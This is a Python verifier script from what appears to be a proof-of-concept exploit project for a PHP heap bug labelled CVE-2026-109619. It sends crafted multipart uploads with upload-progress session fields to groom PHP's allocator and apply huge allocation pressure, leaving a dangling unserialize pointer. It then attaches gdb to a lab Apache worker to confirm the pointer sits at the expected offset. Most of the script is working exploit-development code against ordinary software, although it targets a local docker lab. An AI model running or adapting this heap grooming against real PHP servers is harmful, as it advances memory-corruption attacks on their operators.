#!/usr/bin/env python3 -I
"""Verifier for groom.huge_alloc_pressure: off-chunk pressure yields a DECODE-OOM BG(unserialize)
dangle at the pressure-free chunk geometry (CVE-2026-109619). OBSERVE-only gdb on the worker.

  docker compose -f docker-compose.apache-avenues.yml --profile apsf32 up -d --build      # 8.4.26@32M +gdb
  python3 -I poc/primitives/groom/verify_huge_alloc_pressure.py                  # host, :18794, p2s-apsf32-gdb

PASS: after a HTTP seed + huge-pressure arm, BG(unserialize).data is set (dangling) with BG(serialize)
clear (a DECODE-OOM, not a flush encode-OOM), and the dangling var_entries (E) sits at the
APACHE_SEAT_GEOM e_off -- i.e. the >2 MiB pressure stayed off the 2 MiB request chunk. SKIP if the
lab/gdb is unreachable.
"""
import os
import subprocess
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as H  # noqa: E402
from common.multipart import part as mp_part, terminator  # noqa: E402
from common.offsets import APACHE_SEAT_GEOM  # noqa: E402
from primitives.groom.upload_progress_accumulate import record_parts  # noqa: E402
from primitives.groom import clean_request_reset  # noqa: E402
from primitives.groom.huge_alloc_pressure import pressure_parts  # noqa: E402

HOST = os.environ.get("AP_HOST", "127.0.0.1")
PORT = int(os.environ.get("AP_PORT", "18794"))
CONT = os.environ.get("AP_CONT", "p2s-apsf32-gdb")
VER = os.environ.get("AP_VER", "8.4.26")
SID = "vhap"
BND = b"apsfof"
E_OFF = APACHE_SEAT_GEOM[VER]["e_off"]
_EX = ["set pagination off",
       "set $d=*(void**)((char*)&basic_globals+0x368)",
       'printf "BGU=%p BGS=%p EOFF=0x%lx\\n", $d, *(void**)((char*)&basic_globals+0x358),'
       " ($d?((unsigned long)*(void**)$d & 0x1fffff):0)",
       "detach", "quit"]


def _round(index, fnlen):
    parts = [(b"PHPSESSID", SID.encode(), None)] + record_parts(index, fnlen, 4000)
    body = b"".join(mp_part(n, v, filename=fn, ctype="application/octet-stream", boundary=BND)
                    for n, v, fn in parts) + terminator(BND)
    H.send_multipart_chunked(HOST, PORT, "/plain.php", body, BND, 60)


def main():
    try:
        if b"PID" not in H.body_of(H.get(HOST, PORT, "/pid.php", timeout=5)):
            print("SKIP: lab unreachable"); return 0
    except Exception:
        print("SKIP: lab unreachable"); return 0
    wpid = H.body_of(H.get(HOST, PORT, "/pid.php")).split()[-1].decode()
    for i in range(1, 81):
        _round(i, 5); clean_request_reset.reset(HOST, PORT)
    for i in range(81, 91):
        _round(i, 500000); clean_request_reset.reset(HOST, PORT)
    for _ in range(10):
        clean_request_reset.reset(HOST, PORT)
    # huge-pressure arm (NO clean request after -> keep the dangle live for the read)
    parts = [(b"PHP_SESSION_UPLOAD_PROGRESS", SID.encode(), None), (b"PHPSESSID", SID.encode(), None)]
    parts += pressure_parts(3) + [(b"f", b"Z" * 100, b"a.bin")]
    body = b"".join(mp_part(n, v, filename=fn, ctype="application/octet-stream", boundary=BND)
                    for n, v, fn in parts) + terminator(BND)
    H.send_multipart_chunked(HOST, PORT, "/plain.php", body, BND, 120)
    cmd = ["docker", "exec", CONT, "gdb", "-q", "-batch", "-p", wpid]
    for e in _EX:
        cmd += ["-ex", e]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=40)
    line = next((l for l in r.stdout.splitlines() if l.startswith("BGU=")), "")
    if not line:
        print("SKIP: gdb read failed (need the +gdb profile: SYS_PTRACE)"); return 0
    f = dict(kv.split("=") for kv in line.split())
    bgu, bgs, eoff = f["BGU"], f["BGS"], int(f["EOFF"], 16)
    ok = bgu not in ("(nil)", "0x0") and bgs in ("(nil)", "0x0") and eoff == E_OFF
    print("%s: BGu=%s BGs=%s E_off=0x%x (expect 0x%x; decode-OOM dangle off-chunk)"
          % ("PASS" if ok else "FAIL", bgu, bgs, eoff, E_OFF))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
